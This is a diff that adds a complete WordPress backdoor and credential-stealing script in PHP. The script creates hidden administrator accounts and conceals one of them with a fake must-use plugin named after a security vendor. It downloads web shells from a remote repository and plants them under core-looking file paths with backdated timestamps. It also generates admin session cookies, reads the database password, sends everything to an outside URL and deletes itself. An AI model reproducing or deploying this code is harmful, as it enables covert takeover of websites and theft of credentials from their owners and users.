@@ -1,0 +1,358 @@
+<?php
+@ini_set('display_errors', 0);
+@error_reporting(0);
+
+if (!defined('ABSPATH')) {
+    $base = dirname(__FILE__);
+    $path = false;
+
+    if (@file_exists($base . '/wp-load.php')) {
+        $path = $base;
+    } else {
+        $current_dir = $base;
+        for ($i = 0; $i < 5; $i++) {
+            $parent_dir = dirname($current_dir);
+            if (@file_exists($parent_dir . '/wp-load.php')) {
+                $path = $parent_dir;
+                break;
+            }
+            if ($parent_dir === $current_dir) break;
+            $current_dir = $parent_dir;
+        }
+    }
+
+    if ($path !== false) {
+        define('WP_USE_THEMES', false);
+        require_once($path . '/wp-load.php');
+        if (!function_exists('wp_create_user')) {
+             require_once(ABSPATH . WPINC . '/user.php');
+        }
+        if (!function_exists('wp_generate_auth_cookie')) {
+             require_once(ABSPATH . WPINC . '/pluggable.php');
+        }
+    } else {
+        die("Error: Could not find wp-load.php. Place this script in the WordPress root or a subdirectory.");
+    }
+}
+
+while (ob_get_level() > 0) {
+    ob_end_clean();
+}
+
+$fixed_password = 'SYGNIH$$99';
+$nebar_user = 'mainserong';
+$nebar_email_suffix = '@' . $_SERVER['HTTP_HOST'];
+$payload_url = 'https://raw.githubusercontent.com/ASDF710/ZAYN/refs/heads/main/ua';
+$adminer_url = 'https://raw.githubusercontent.com/ASDF710/ZAYN/refs/heads/main/ADMINER';
+$uploader_url = 'https://raw.githubusercontent.com/ASDF710/ZAYN/refs/heads/main/404litespeed';
+$exfil_url = 'https://raw.githubusercontent.com/ASDF710/ZAYN/refs/heads/main/natsu2';
+$additional_shell_url = 'https://raw.githubusercontent.com/ASDF710/ZAYN/refs/heads/main/.zayn';
+$maintenance_shell_url = 'https://raw.githubusercontent.com/ASDF710/ZAYN/refs/heads/main/hostinger';
+
+$stealth_usernames = [
+    'litespeed-admin', 'sucuri-admin', 'wordfence-system', 'cloudflare-service',
+    'jetpack-sync', 'wp-system', 'updater-admin', 'maintenance-user',
+    'yoast-service', 'wprocket-cache'
+];
+
+$nebar_file_paths = [
+    "./wp-includes/random_compat/random_bytes_bcrypt.php",
+    "./wp-admin/load-media.php", "./wp-admin/includes/admin-action.php",
+    "./wp-admin/includes/class-bulk-language-upgrader-skin.php",
+    "./wp-admin/network/site-media.php",
+    "./wp-includes/rest-api/endpoints/class-wp-rest-api-settings-controller.php",
+    "./wp-includes/SimplePie/Decode/HTML/Dentities.php", "./wp-includes/SimplePie/library/Library.php",
+    "./wp-includes/blocks/navigation/view-modal.max.asset.php",
+    "./wp-includes/sodium_compat/namespaced/Load-Hash.php",
+    "./wp-includes/style-engine/class-wp-style-engine-css-rules-declarations.php",
+    "./wp-includes/certificates/ca-bundle.php", "./wp-includes/fonts/custom-metrics.php",
+    "./wp-includes/customize/class-wp-customize-filter.php", "./wp-content/upgrade/session.php",
+    "./wp-content/languages/continents-cities-id_ID.php", "./wp-content/plugins/index-extra.php",
+    "./wp-content/themes/twentytwentytwo/inc/patterns/hidden-404.php"
+];
+
+function generate_strong_password($length = 16) {
+    $chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_=+';
+    $password = '';
+    for ($i = 0; $i < $length; $i++) {
+        $password .= $chars[rand(0, strlen($chars) - 1)];
+    }
+    return $password;
+}
+
+function get_stealth_plugin_details($username) {
+    $details = [
+        'litespeed-admin' => ['name' => 'LiteSpeed Cache Extensions', 'file' => 'litespeed-cache-extensions.php'],
+        'sucuri-admin' => ['name' => 'Sucuri Security Extensions', 'file' => 'sucuri-firewall-module.php'],
+        'wordfence-system' => ['name' => 'Wordfence Scanner Module', 'file' => 'wordfence-scan-utilities.php'],
+        'cloudflare-service' => ['name' => 'Cloudflare Integration Module', 'file' => 'cloudflare-integration.php'],
+        'jetpack-sync' => ['name' => 'Jetpack Performance Module', 'file' => 'jetpack-performance.php'],
+        'wp-system' => ['name' => 'WordPress System Utilities', 'file' => 'wp-system-utilities.php'],
+        'updater-admin' => ['name' => 'WordPress Update Manager', 'file' => 'wp-update-manager.php'],
+        'maintenance-user' => ['name' => 'Maintenance Mode Module', 'file' => 'maintenance-module.php'],
+        'yoast-service' => ['name' => 'Yoast SEO Extensions', 'file' => 'yoast-seo-extensions.php'],
+        'wprocket-cache' => ['name' => 'WP Rocket Advanced Cache', 'file' => 'wprocket-advanced-cache.php']
+    ];
+    return $details[$username] ?? ['name' => 'System Performance Module', 'file' => 'system-module.php'];
+}
+
+function touch_file_to_system_time($file_path) {
+    $ref_file = null;
+    $possible_ref_files = ['/etc/passwd', '/etc/hosts', ABSPATH . 'index.php', ABSPATH . 'wp-includes/version.php'];
+    foreach ($possible_ref_files as $pfile) {
+        if (@file_exists($pfile)) { $ref_file = $pfile; break; }
+    }
+    if ($ref_file && @file_exists($file_path)) {
+        $ref_time = @filemtime($ref_file);
+        if ($ref_time) {
+            $random_offset = rand(1, 60) * DAY_IN_SECONDS;
+            @touch($file_path, $ref_time - $random_offset, $ref_time - $random_offset);
+            return basename($ref_file);
+        }
+    }
+    return false;
+}
+
+$output = "===== COMBO EXECUTION REPORT =====" . PHP_EOL;
+$output .= "Timestamp: " . date('Y-m-d H:i:s') . PHP_EOL;
+$output .= "Domain: " . $_SERVER['HTTP_HOST'] . PHP_EOL;
+$output .= "--------------------------------" . PHP_EOL . PHP_EOL;
+
+
+$output .= "### 2. Backdoor Deployment ###" . PHP_EOL;
+$nebar_user_id = null;
+$nebar_user_created = false;
+if (!username_exists($nebar_user)) {
+    $nebar_user_id = wp_create_user($nebar_user, $fixed_password, $nebar_user . $nebar_email_suffix);
+    if (!is_wp_error($nebar_user_id)) {
+        $user = new WP_User($nebar_user_id);
+        $user->set_role('administrator');
+        $nebar_user_created = true;
+        $output .= "Created nebar user: " . $nebar_user . " / " . $fixed_password . PHP_EOL;
+    } else {
+        $output .= "Error creating nebar user '" . $nebar_user . "': " . $nebar_user_id->get_error_message() . PHP_EOL;
+    }
+} else {
+    $output .= "Nebar user '" . $nebar_user . "' already exists." . PHP_EOL;
+    $nebar_user_obj = get_user_by('login', $nebar_user);
+    if ($nebar_user_obj) $nebar_user_id = $nebar_user_obj->ID;
+}
+
+$payload_content = @file_get_contents($payload_url);
+if ($payload_content === false) {
+    $output .= "Warning: Failed to fetch main payload from " . $payload_url . PHP_EOL;
+    $payload_content = "<?php // Payload fetch failed ?>";
+}
+
+$adminer_content = @file_get_contents($adminer_url);
+$uploader_content = @file_get_contents($uploader_url);
+$additional_shell_content = @file_get_contents($additional_shell_url);
+if ($additional_shell_content === false) {
+    $output .= "Warning: Failed to fetch additional shell from " . $additional_shell_url . PHP_EOL;
+    $additional_shell_content = "<?php // Additional shell fetch failed ?>";
+}
+
+$maintenance_shell_content = @file_get_contents($maintenance_shell_url);
+if ($maintenance_shell_content === false) {
+    $output .= "Warning: Failed to fetch maintenance shell from " . $maintenance_shell_url . PHP_EOL;
+    $maintenance_shell_content = "<?php // Maintenance shell fetch failed ?>";
+}
+
+$nebar_special_files = [
+    "./wp-includes/js/dist/vendor/wp-polyfill-fetch.min.php" => $adminer_content ?: $payload_content,
+    "./wp-includes/php-compat/readsonly.php" => $uploader_content ?: $payload_content,
+    ABSPATH . "/wp-admin/network/cache/index.php" => $additional_shell_content,
+    ABSPATH . "/wp-admin/css/maintenance.php" => $maintenance_shell_content
+];
+
+$output .= "Backdoor File URLs:" . PHP_EOL;
+$created_files = 0;
+$failed_files = 0;
+$successful_urls = [];
+$failed_paths = [];
+
+$all_files_to_write = [];
+foreach ($nebar_file_paths as $path) $all_files_to_write[$path] = $payload_content;
+foreach ($nebar_special_files as $path => $content) $all_files_to_write[$path] = $content;
+
+foreach ($all_files_to_write as $file_path => $content_to_write) {
+    $dir = dirname($file_path);
+    if (!is_dir($dir)) {
+        @mkdir($dir, 0777, true);
+    }
+    if (@file_put_contents($file_path, $content_to_write)) {
+        touch_file_to_system_time($file_path);
+        $file_url = "http" . (is_ssl() ? "s" : "") . "://" . $_SERVER['HTTP_HOST'] . str_replace(ABSPATH, '', str_replace("./", "/", $file_path));
+        $successful_urls[] = $file_url;
+        $created_files++;
+    } else {
+        $failed_paths[] = $file_path;
+        $failed_files++;
+    }
+}
+
+foreach($successful_urls as $url) {
+    $output .= "  " . $url . PHP_EOL;
+}
+
+if ($failed_files > 0) {
+    $output .= PHP_EOL . "Failed to create:" . PHP_EOL;
+    foreach($failed_paths as $path) {
+        $output .= "  [-] " . $path . PHP_EOL;
+    }
+}
+
+$output .= "Result: Created " . $created_files . " backdoor files, Failed: " . $failed_files . PHP_EOL;
+$output .= PHP_EOL;
+
+$output .= "### 3. Stealth Admin Creation ###" . PHP_EOL;
+$stealth_user = null;
+$stealth_pass = null;
+$stealth_email = null;
+$stealth_plugin_details = null;
+$stealth_created = false;
+
+$selected_stealth_username = null;
+shuffle($stealth_usernames);
+foreach ($stealth_usernames as $potential_user) {
+    $potential_email = $potential_user . $nebar_email_suffix;
+    if (!username_exists($potential_user) && !email_exists($potential_email)) {
+        $selected_stealth_username = $potential_user;
+        break;
+    }
+}
+
+if ($selected_stealth_username) {
+    $stealth_user = $selected_stealth_username;
+    $stealth_pass = generate_strong_password();
+    $stealth_email = $stealth_user . $nebar_email_suffix;
+    $stealth_plugin_details = get_stealth_plugin_details($stealth_user);
+
+    $user_id = wp_create_user($stealth_user, $stealth_pass, $stealth_email);
+
+    if (!is_wp_error($user_id)) {
+        $user = new WP_User($user_id);
+        $user->set_role('administrator');
+        update_user_meta($user_id, 'show_admin_bar_front', 'false');
+
+        $mu_plugins_dir = defined('WPMU_PLUGIN_DIR') ? WPMU_PLUGIN_DIR : ABSPATH . 'wp-content/mu-plugins';
+        $mu_dir_created = false;
+        if (!is_dir($mu_plugins_dir)) {
+            if (@mkdir($mu_plugins_dir, 0755, true)) {
+                 $mu_dir_created = true;
+                 touch_file_to_system_time($mu_plugins_dir);
+            }
+        }
+
+        if (is_dir($mu_plugins_dir) && is_writable($mu_plugins_dir)) {
+            $plugin_filepath = $mu_plugins_dir . '/' . $stealth_plugin_details['file'];
+            $plugin_content = '<?php
+/** Plugin Name: ' . $stealth_plugin_details['name'] . ' */
+add_filter("users_list_table_query_args", function($args) {
+    $exclude_user = get_user_by("login", "' . esc_sql($stealth_user) . '");
+    if ($exclude_user) {
+        $args["exclude"] = array_merge((array)($args["exclude"] ?? []), [$exclude_user->ID]);
+    }
+    return $args;
+});';
+            if (@file_put_contents($plugin_filepath, $plugin_content)) {
+                $ref = touch_file_to_system_time($plugin_filepath);
+                $output .= "Created stealth user: " . $stealth_user . " / " . $stealth_pass . PHP_EOL;
+                $output .= "Hiding via MU Plugin: " . $stealth_plugin_details['file'] . ($ref ? " (Touched: " . $ref . ")" : "") . PHP_EOL;
+                $stealth_created = true;
+            } else {
+                $output .= "Error: Could not write MU plugin: " . $plugin_filepath . PHP_EOL;
+                $output .= "Created stealth user (visible): " . $stealth_user . " / " . $stealth_pass . PHP_EOL;
+            }
+        } else {
+            $output .= "Warning: MU plugins directory not writable: " . $mu_plugins_dir . PHP_EOL;
+            $output .= "Created stealth user (visible): " . $stealth_user . " / " . $stealth_pass . PHP_EOL;
+        }
+    } else {
+        $output .= "Error creating stealth user '" . $stealth_user . "': " . $user_id->get_error_message() . PHP_EOL;
+    }
+} else {
+    $output .= "Result: Could not find an available stealth username." . PHP_EOL;
+}
+$output .= PHP_EOL;
+
+$output .= "### 4. Authentication Cookies ###" . PHP_EOL;
+$admin_users_after = get_users(['role' => 'administrator', 'fields' => ['ID', 'user_login']]);
+$cookie_output = "";
+if (!empty($admin_users_after)) {
+    $expiration = time() + (30 * DAY_IN_SECONDS);
+    $cookie_domain = defined('COOKIE_DOMAIN') && COOKIE_DOMAIN ? COOKIE_DOMAIN : '';
+    if (empty($cookie_domain)) {
+        $host = $_SERVER['HTTP_HOST'];
+        $host = preg_replace('/^www\./', '', $host);
+        if (strpos($host, '.') !== false && !filter_var($host, FILTER_VALIDATE_IP)) {
+            $cookie_domain = '.' . $host;
+        } else {
+            $cookie_domain = $host;
+        }
+    }
+    $is_ssl = is_ssl();
+
+    $cookie_output .= "Expiration: " . date('Y-m-d H:i:s', $expiration) . PHP_EOL;
+    $cookie_output .= "Domain: " . $cookie_domain . PHP_EOL;
+    $cookie_output .= "Protocol: " . ($is_ssl ? "HTTPS" : "HTTP") . PHP_EOL . PHP_EOL;
+
+    foreach ($admin_users_after as $user) {
+        $scheme = $is_ssl ? 'secure_auth' : 'auth';
+        $auth_cookie = wp_generate_auth_cookie($user->ID, $expiration, $scheme);
+        $logged_in_cookie = wp_generate_auth_cookie($user->ID, $expiration, 'logged_in');
+
+        $auth_cookie_name = $is_ssl ? SECURE_AUTH_COOKIE : AUTH_COOKIE;
+        $logged_in_cookie_name = LOGGED_IN_COOKIE;
+
+        $cookie_output .= "[ User: " . $user->user_login . " (ID: " . $user->ID . ") ]" . PHP_EOL;
+        $cookie_output .= "  Auth Cookie Name: " . $auth_cookie_name . PHP_EOL;
+        $cookie_output .= "  Auth Cookie Value: " . $auth_cookie . PHP_EOL;
+        $cookie_output .= "  Logged In Cookie Name: " . $logged_in_cookie_name . PHP_EOL;
+        $cookie_output .= "  Logged In Cookie Value: " . $logged_in_cookie . PHP_EOL;
+        $cookie_output .= "---" . PHP_EOL;
+    }
+} else {
+    $cookie_output .= "Result: No admin users found to generate cookies for." . PHP_EOL;
+}
+$output .= $cookie_output . PHP_EOL;
+
+$output .= "### 5. Database Information ###" . PHP_EOL;
+global $wpdb;
+$db_info = "DB_NAME: " . (defined('DB_NAME') ? DB_NAME : "N/A") . PHP_EOL;
+$db_info .= "DB_USER: " . (defined('DB_USER') ? DB_USER : "N/A") . PHP_EOL;
+$db_info .= "DB_PASSWORD: " . (defined('DB_PASSWORD') ? DB_PASSWORD : "N/A") . PHP_EOL;
+$db_info .= "DB_HOST: " . (defined('DB_HOST') ? DB_HOST : "N/A") . PHP_EOL;
+$db_info .= "TABLE_PREFIX: " . ($wpdb->prefix ?? "N/A") . PHP_EOL;
+$output .= $db_info . PHP_EOL;
+
+$output .= "===== END OF REPORT =====" . PHP_EOL;
+
+$exfil_data = $output;
+$exfil_filename = $_SERVER['HTTP_HOST'] . '.txt';
+
+$send_url = $exfil_url . '?save_file=' . urlencode($exfil_filename) . '&data=' . urlencode($exfil_data);
+
+$context = stream_context_create(['http' => ['ignore_errors' => true, 'timeout' => 5]]);
+$exfil_result = @file_get_contents($send_url, false, $context);
+
+@header('Content-Type: text/plain; charset=utf-8');
+echo $output;
+
+if ($exfil_result === false) {
+    echo PHP_EOL . "--- Exfiltration WARNING: Failed to send data to " . $exfil_url . " ---" . PHP_EOL;
+} else {
+     echo PHP_EOL . "--- Exfiltration INFO: Data sent attempt finished ---" . PHP_EOL;
+}
+
+// Self-destruct: Attempt to delete this script file
+if (@unlink(__FILE__)) {
+    $output .= PHP_EOL . "--- Self-Destruct: Script file deleted successfully ---" . PHP_EOL;
+} else {
+    $output .= PHP_EOL . "--- Self-Destruct WARNING: Failed to delete script file ---" . PHP_EOL;
+}
+
+echo $output;
+
+exit;
+?>
